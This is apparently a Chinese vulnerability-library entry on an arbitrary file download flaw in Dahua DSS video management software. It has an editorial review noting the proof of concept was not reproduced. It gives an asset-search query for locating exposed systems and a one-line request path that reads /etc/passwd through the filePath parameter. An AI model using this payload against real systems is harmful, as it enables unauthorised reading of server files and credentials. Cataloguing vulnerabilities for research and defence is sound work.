---
source: "wy876 漏洞文库"
id: "vw-4b854e964b1731ffcc293ddb"
entity_id: "ve-4b854e964b1731ffcc293ddb"
schema_version: "1"
fofa_unverified: "app.name=="
title: "大华 DSS 视频管理系统 attachment_downloadByUrlAtt.action 任意文件下载漏洞"
product: "大华DSS视频管理软件"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "版本/会话未知，file:///etc/passwd"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%AE%BE%E5%A4%87/%E5%A4%A7%E5%8D%8EDSS%E8%A7%86%E9%A2%91%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fattachment_downloadByUrlAtt.action%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/mb3iwwsxiz2bvrek"
source_status: "recorded"
---

# 大华 DSS 视频管理系统 attachment_downloadByUrlAtt.action 任意文件下载漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：大华DSS视频管理软件
- 本文讨论：portal/attachment_downloadByUrlAtt.action filePath本地URL读取
- 版本、权限与配置前提：版本/会话未知，file:///etc/passwd
- 资料类型：文件读取接口线索；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 仅路径无请求响应或鉴权说明，任意文件仍受进程读权限限制
- Hunter提取成残缺fofa，软件不宜仅归其他IoT
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- DSS与园区共用组件/版本及认证待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
大华 DSS 视频管理系统存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件

# 二、影响版本
+ 大华 DSS 视频管理系统

# 三、资产测绘
+ hunter：`app.name=="Dahua 大华 DSS 视频管理系统"`


+ 登录页面


# 四、漏洞复现
```plain
/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mb3iwwsxiz2bvrek>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
